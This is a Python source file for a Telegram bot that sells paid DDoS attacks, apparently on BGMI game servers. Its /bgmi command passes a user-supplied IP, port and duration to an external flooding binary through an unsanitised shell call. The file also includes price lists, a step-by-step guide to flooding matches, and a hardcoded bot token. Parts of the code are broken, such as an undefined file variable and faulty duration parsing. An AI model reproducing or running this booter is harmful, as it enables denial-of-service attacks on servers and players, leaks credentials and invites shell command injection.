#script by @MR_ARMAN_OWNER

import subprocess
import datetime
import os
import telebot
import time
import threading
import time
import random
import string
from telebot import TeleBot
from telebot import types
import sys

# insert your Telegram bot token here
bot = telebot.TeleBot('8143590045:AAHuEOvLesMWRgw6uzOMyGpQu4QgLI6y-uE')

API_TOKEN = '8143590045:AAHuEOvLesMWRgw6uzOMyGpQu4QgLI6y-uE'  # Replace with your bot's API token
bot = telebot.TeleBot(API_TOKEN)

# Define the owner's user ID
OWNER_ID = 6077036964  # Replace with your actual Telegram user ID
# Admin user IDs
admin_id = ["6077036964"]
# Replace with your actual admin user IDs
ADMIN_IDS = [6077036964]  # Example admin user ID

# File to store allowed user IDs
USER_FILE = "users.txt"

# Define a dictionary to store keys and their validity status
keys = {}


# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["6077036964"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"💐 HELLO {user_to_add}!\n🎉 CONGRATULATIONS! YOU'RE APPROVED ✅ \n🌟 WELCOME TO THE ARMAN TEAM!\n🚀 GET READY TO ENJOY ALL THE EXCLUSIVE FEATURES!\n👤 APPROVED BY @MR_ARMAN_OWNER\n\nAPPROVED FOR{duration} {time_unit}\n⚡\nACCESS WILL BE ACTIVE UNTIL{user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍.\n\n💫 LET THE FUN BEGIN! 🎊."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "You have not purchased yet purchase now from:- @MR_ARMAN_OWNER."

    bot.reply_to(message, response)

@bot.message_handler(commands=['myinfo'])
def send_user_info(message):
    bot.reply_to(message, "CHECKING YOUR WHOLE INFO....")
    time.sleep(3)  # Simulate a delay for checking info

    user_info = f"""
    Username: @{message.from_user.username}
    User ID: {message.from_user.id}
    First Name: {message.from_user.first_name}
    Last Name: {message.from_user.last_name if message.from_user.last_name else 'N/A'}
    Last Seen: (This information is not available due to privacy settings)
    Status: (This information is not available)
    Admin: {'Yes' if message.from_user.id in ADMIN_IDS else 'No'}
    Used this bot: {'Yes' if user_used_bot(message.from_user.id) else 'No'}
    """
    
    bot.send_message(message.chat.id, user_info)

def user_used_bot(user_id):
    # Implement logic to check if the user has used the bot before
    return False  # Placeholder

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @MR_ARMAN_OWNER 🙇."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "You have not purchased yet purchase now from :- @MR_ARMAN_OWNER ❄."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @MR_ARMAN_OWNER 🙇."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @MR_ARMAN_OWNER❄."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "𝙏𝙝𝙞𝙨 𝘽𝙤𝙩 𝙞𝙨 𝙤𝙣𝙡𝙮 𝙛𝙤𝙧 𝙥𝙖𝙞𝙙 𝙪𝙨𝙚𝙧𝙨 𝙗𝙪𝙮 𝙣𝙤𝙬 𝙛𝙧𝙤𝙢 - @MR_ARMAN_OWNER \n205 KALA JADU "
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🌠 STRATEGY DEPLOYED 🌠\n\n🚀 TARGET LOCKED [ ON YOUR SERVER ]... 💥\n⚔ BATTLE HAS COMMENCED ⚔\n\n🥷 ASSAULTING HOST ==) ( {target} )\n🥷 ENGAGED PORT ==) ( {port} )\n⏰ ATTACK DURATION -> ( {time} ) SECONDS 🔥\n\n💎 EXECUTED BY ARMAN TEAM ⚔\n\nnHOLD YOUR POSITION, NO ACTION NEEDED FOR {time} SECONDS\nTHANK YOU FOR UTILIZING AUR HAX 💫\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =10

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "⏳ 10-𝙨𝙚𝙘𝙤𝙣𝙙 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙞𝙨 𝙣𝙤𝙬 𝙖𝙥𝙥𝙡𝙞𝙚𝙙!\n🔄 𝙒𝙖𝙞𝙩 𝙖𝙣𝙙 𝙜𝙖𝙩𝙚 𝙩𝙝𝙚 𝙢𝙤𝙢𝙚𝙣𝙩\n⏳ 𝙀𝙣𝙟𝙤𝙮 𝙩𝙝𝙚 𝙚𝙣𝙙𝙡𝙚𝙫𝙤𝙧 𝙧𝙞𝙙𝙚!\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 300:
                response = "⚠️ 𝙀𝙧𝙧𝙤𝙧: 𝙏𝙞𝙢𝙚 𝙞𝙣𝙩𝙚𝙧𝙫𝙖𝙡 𝙢𝙪𝙨𝙩 𝙗𝙚 𝙡𝙚𝙨𝙨 𝙩𝙝𝙖𝙣 300.\n🔍 𝘾𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝙞𝙣𝙥𝙪𝙩 𝙖𝙣𝙙 𝙬𝙚𝙡𝙡 𝙖𝙙𝙟𝙪𝙨𝙩 𝙩𝙝𝙚 𝙝𝙖𝙣𝙙𝙡𝙚𝙙 𝙩𝙞𝙢𝙚.\n✔️ 𝘿𝙤𝙣'𝙩 𝙝𝙚𝙨𝙞𝙩𝙖𝙩𝙚 𝙩𝙤 𝙨𝙚𝙚 𝙚𝙓𝙥𝙚𝙧𝙩 𝙞𝙣𝙛𝙤 𝙛𝙤𝙧 𝙬𝙤𝙧𝙠𝙨𝙝𝙤𝙥𝙨.."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./JUPITER {target} {port} {time}"
                # Run the external command
                process = subprocess.run(full_command, shell=True)
                # Handle the response
                response = f"⚠️ 𝙏𝘼𝙍𝙂𝙀𝙏 𝘿𝙀𝙏𝘼𝙄𝙇𝙎 ⚠️\n\n✅ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿\n🔍 𝙏𝘼𝙍𝙂𝙀𝙏: {target}\n🔌 𝙋𝙊𝙍𝙏: {port}\n\n🕒 𝙏𝙄𝙈𝙀: {time}\n\n🔥 𝙇𝙚𝙩 𝙩𝙝𝙚 𝙘𝙝𝙖𝙤𝙨 𝙪𝙣𝙛𝙤𝙡𝙙. 𝙀𝙫𝙚𝙧𝙮 𝙘𝙡𝙤𝙪𝙙 𝙤𝙛 𝙙𝙚𝙨𝙤𝙡𝙖𝙩𝙞𝙤𝙣 𝙣𝙤𝙬 𝙙𝙖𝙧𝙠𝙚𝙣𝙨\n\n💥 𝙂𝙞𝙫𝙚 𝙣𝙤 𝙫𝙤𝙞𝙘𝙚 𝙩𝙤 𝙨𝙩𝙧𝙞𝙭 𝙛𝙤𝙧 𝙡𝙞𝙣𝙪𝙨! 🚨 𝘿𝙞𝙎𝘾𝙊𝙉𝙏𝙀𝙉𝙏 🏴‍☠️\n\n👁️ 𝙒𝘼𝙏𝘾𝙃 𝙤𝙪𝙩 𝙛𝙤𝙧 𝙧𝙚𝙩𝙡𝙖𝙩𝙞𝙤𝙣𝙨! 𝙏𝙝𝙚 𝙟𝙤𝙪𝙧𝙣𝙖𝙡 𝙤𝙛 𝙖𝙣𝙖𝙧𝙘𝙝𝙮 𝙝𝙖𝙨 𝙗𝙚𝙜𝙪𝙣."
                bot.send_message(message.chat.id, "SEND FEEDBACK 😡")
        else:
            response = "📝 DEAR USERS \n\n📜 USAGE DETAILS:\n/bgmi <IP> <PORT> <TIME>\n\n✨ EXAMPLE:\n- /bgmi 20.0.0.0 8700 120\n\n⚔️ LET'S THE WAR BEGIN!\n\n🔍 MORE INFORMATION:\n- <IP>: Target's IP address\n- <PORT>: Specific port for the attack\n- <TIME>: Duration of the attack in seconds\n\n❗️ USE RESPONSIBLY!\n\nᴛʜɪ𝙨 ʙᴏᴛ ᴏᴡɴᴇʀ ❤️‍🩹:--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"  # Updated command syntax
    else:
        response = ("🚫 UNAUTHORIZED ACCESS! 🚫\n\nNoops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:\n\n🔑 VERIFY YOUR PERMISSIONS\n📝 REQUEST ACCESS FROM AN ADMIN\n\n📞 IF YOU STILL NEED HELP, CONTACT SUPPORT.ꜱ!\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @MR_ARMAN_OWNER")
        bot.send_message(message.chat.id, "DM TO BUY ACCES :- @MR_ARMAN_OWNER ✅")
    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def send_help_message(message):
    bot.send_message(message.chat.id, "It seems like you would like more information! Here’s what each command does")
    time.sleep(0.5)  # Wait for 0.5 seconds

    bot.send_message(message.chat.id, "💥 /bgmi : Initiate an attack on your target. Be prepared for the results! 🚀")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /rules : Review the rules to understand the guidelines and regulations of the platform. ⚖️")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /mylogs : Check your activity logs to track your actions and engagements. 📜")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /plan : Explore the different plans available to enhance your experience. 🌟")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /myinfo : Access details about your account, including settings and status. 🔍")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /admincmd : (Admins only) View all available commands meant for admin users. 📋")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "If you need any specific command to be executed or further information, just let me know!")


keys = {}

def generate_key(days):
    return f"KEY-{days}-DAYS"

@bot.message_handler(commands=['genkey'])
def genkey_command(message):
    if message.from_user.id != OWNER_ID:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return
    
    try:
        # Extract days from the command
        parts = message.text.split()
        days = int(parts[1])  # Example: /genkey 99
        new_key = generate_key(days)
        keys[new_key] = True  # Store key as valid
        bot.send_message(message.chat.id, f"Generated key: {new_key}")

    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "Usage: /genkey <number of days>")

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    key_to_redeem = message.text.split(maxsplit=1)

    if len(key_to_redeem) != 2:
        response = "Usage: /redeem <key>"
        bot.send_message(message.chat.id, response)
        return 

    key_value = key_to_redeem[1]

    if key_value in keys:
        if keys[key_value]:
            response = f"Key '{key_value}' redeemed successfully!"
            keys[key_value] = False  # Mark key as used
        else:
            response = f"Key '{key_value}' has already been redeemed."
    else:
        response = "Invalid key. Please check and try again."

    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED PRIVATE  OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)




@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "🎉 Welcome to the Bot! It's now online! ✅")
    time.sleep(0.2)  
    bot.send_message(message.chat.id, "👑 Owner of this bot is the one and only: @MR_ARMAN_OWNER")
    time.sleep(0.2)  
    bot.send_message(message.chat.id, "⚔️ Are you ready for adventure? Type `/bgmi` or /help for assistance!")
    time.sleep(0.2)  
    bot.send_message(message.chat.id, "🌟 Want to unlock exclusive features? Run /plan to become a PREMIUM MEMBER!")
    time.sleep(0.2)
    bot.send_message(message.chat.id, "🚀 Let's get started and make the most out of your experience!")

    # Create buttons for user interaction
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    attack_button = types.KeyboardButton("attack")
    contact_button = types.KeyboardButton("Contact Owner")
    check_status_button = types.KeyboardButton("my info")
    buy_button = types.KeyboardButton("Buy")
    reselling_panel_button = types.KeyboardButton("Reselling Panel")
    referral_link_button = types.KeyboardButton("Referral Link")
    how_to_use_button = types.KeyboardButton("HOW TO USE")
    
    markup.add(attack_button, contact_button, check_status_button, buy_button, reselling_panel_button, referral_link_button, how_to_use_button)
    bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)

# Handle button presses
@bot.message_handler(func=lambda message: message.text == "attack")
def attack_function(message):
    bot.send_message(message.chat.id, "USAGE: /bgmi <IP> <PORT> <TIME>")

@bot.message_handler(func=lambda message: message.text == "Contact Owner")
def contact_owner(message):
    bot.send_message(message.chat.id, "You can contact the owner at @MR_ARMAN_OWNER")

@bot.message_handler(func=lambda message: message.text == "my info")
def check_status(message):
    bot.send_message(message.chat.id, "CHECKING YOUR WHOLE INFO... PLEASE WAIT!")  
    time.sleep(3)
    bot.send_message(message.chat.id, "MESSAGE - SUCCESSFULLY CHECKED")  
    time.sleep(1)

    user_info = (
        "HERES YOUR INFO...\n\n"
        f"Username: @{message.from_user.username}\n"
        f"User ID: {message.from_user.id}\n"
        f"First Name: {message.from_user.first_name}\n"
        f"Last Name: {message.from_user.last_name if message.from_user.last_name else 'N/A'}\n\n"
        "Last Seen: (This information is not available due to privacy settings)\n"
        "Status: (This information is not available)\n"
        f"Admin: {'Yes' if message.from_user.id in ADMIN_IDS else 'No'}\n"
        f"Used this bot: {'Yes' if user_used_bot(message.from_user.id) else 'No'}"
    )
    bot.send_message(message.chat.id, user_info)

@bot.message_handler(func=lambda message: message.text == "Buy")
def buy_function(message):
    response_message = (
        "D-DOS ATTACK PRICING 3.4 & 3.5 🚀\n"
        "🌟  1 DAY: 100 FIX 💵\n"
        "🌟  3 DAYS: 150 (EXTRA 2 DAY!) 🎊\n"
        "🌟  7 DAYS: 230 (EXTRA 3 DAY!) 🎊\n"
        "🌟  15 DAYS: 360 (EXTRA 5 DAYS!) 🤑\n"
        "🌟  30 DAYS: 650 (EXTRA 7 DAYS!) 🤑\n"
        "🛡️ AVAILABLE 24/7 FOR YOU!\n"
        "💡 24/7 RUN 💥\n"
        "⚡ 240 SECOND RESPONSE TIME! 🥈12 hours run !\n"
        "📲 Reach Out: @MR_ARMAN_OWNER"
    )
    bot.send_message(message.chat.id, response_message)

@bot.message_handler(func=lambda message: message.text == "Reselling Panel")
def reselling_panel(message):
    bot.send_message(message.chat.id, "COMING SOON...")

@bot.message_handler(func=lambda message: message.text == "Referral Link")
def referral_link(message):
    bot.send_message(message.chat.id, "Your referral link is: @ARMANTEAMVIP")


@bot.message_handler(func=lambda message: message.text == "HOW TO USE")
def how_to_use_function(message):
    bot.send_message(message.chat.id, "PLEASE WAIT...")
    time.sleep(3)  # Wait 3 seconds

    # Send "GENERATING DONE ✅..."
    bot.send_message(message.chat.id, "GENERATING DONE ✅...")
    time.sleep(3)  # Wait 3 seconds

    # Start sending usage instructions with live typing
    bot.send_message(message.chat.id, "HERE'S THE HOW TO USE MESSAGE 👇🏻")
    
    usage_instructions = [
        "1. FIRST YOU NEED TO DOWNLOAD HTTP CONNERY APP",
        "2. OPEN THE INSTALLED APP",
        "3. GIVE PERMISSION ✅",
        "4. OPEN bgmi ✨",
        "5. ENTER MATCH AND OPEN FLOODING WINDOW",
        "6. OPEN HTTP APP AND PRESS THE BUTTON ✅",
        "7. COPY IP AND PORT REMEMBER IT.",
        "8. OPEN TELEGRAM AND GIVE COMMANDS TO BOT",
        "'/bgmi YOUR <IP> YOUR <PORT> AND TIME <TIME> SECONDS!'",
        "DONE ✅ CHECK MATCH PING",
        "9. HOW TO CHECK WHICH PORT IS CORRECT AND WHICH IS WRONG - RUN THIS COMMAND /check TO CHECK RIGHT PORT's!",
        "THIS BOT OWNER :- @MR_ARMAN_OWNER ✅",
        "JOIN OFFICIAL GRP :- @ARMANTEAMVIP ✅",
        "OFFICIAL BOT :- COMING SOON 😁",
        "THANKS FOR USING AUR HAX 🔥😍"
    ]

    # Typing each instruction with delay
    for instruction in usage_instructions:
        bot.send_chat_action(message.chat.id, 'typing')  # Simulate typing
        time.sleep(0.2)  # Slight delay for typing effect
        bot.send_message(message.chat.id, instruction)
        time.sleep(0.2)  # Wait before sending the next message

# Ensure to call this function in response to the appropriate command

@bot.message_handler(commands=['plan'])
def send_plan(message):
    user_name = message.from_user.username
    bot.send_message(message.chat.id, f"@{user_name}, 😅 WELCOME TO ARMAN TEAM DDOS BOT !!")
    time.sleep(1)  # 1 second delay
    
    bot.send_message(message.chat.id, "Vip 🌟\n\n:-> Attack Time : 300 (S)-\n> After Attack Limit : 10 sec\n-> Concurrents Attack : 5")
    time.sleep(0.5)  # 0.5 second delay
    
    bot.send_message(message.chat.id, "Pr-ice List💸\n\n:Day-->80Rs\nWeek-->250Rs\nMonth-->990 Rs")
    time.sleep(0.5)  # 0.5 second delay
    
    bot.send_message(message.chat.id, "To buy, contact us: -- @MR_ARMAN_OWNER")
    
@bot.message_handler(commands=['admincmd'])
def welcome_message(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "𝘼𝙇𝙀𝙍𝙏 ⚠️‼️\n𝙏𝙃𝙄𝙎 𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝙎𝙀𝙉𝙏 𝙁𝙍𝙊𝙈 :--> 𝘼𝙍𝙈𝘼𝙉 𝙏𝙀𝘼𝙈 ✅:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


